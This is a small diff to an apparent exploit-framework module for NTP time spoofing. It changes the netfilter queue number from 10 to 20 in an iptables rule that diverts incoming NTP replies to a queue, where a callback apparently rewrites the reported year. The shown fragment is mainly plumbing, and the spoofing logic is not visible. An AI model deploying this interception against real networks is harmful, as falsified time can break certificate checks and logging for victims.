@@ -92,11 +92,11 @@ class exploit(Sploit):
 		self.log('Starting')
 		######### MAIN CODE ###########
 		# Iptables rule for NTP packets
-		os.system('iptables -t raw -A PREROUTING -p udp --sport 123 -j NFQUEUE --queue-num 10')
+		os.system('iptables -t raw -A PREROUTING -p udp --sport 123 -j NFQUEUE --queue-num 20')
 		# Filter packets
 		nfqueue = NetfilterQueue()
-		# 10 is the iptables rule queue number
-		nfqueue.bind(10, self.manipulate)
+		#20 is the iptables rule queue number
+		nfqueue.bind(20, self.manipulate)
 		try:
 			self.log("[!] Waiting for NTP packages to spoof (Year = "+str(self.year)+" )")
 			nfqueue.run()
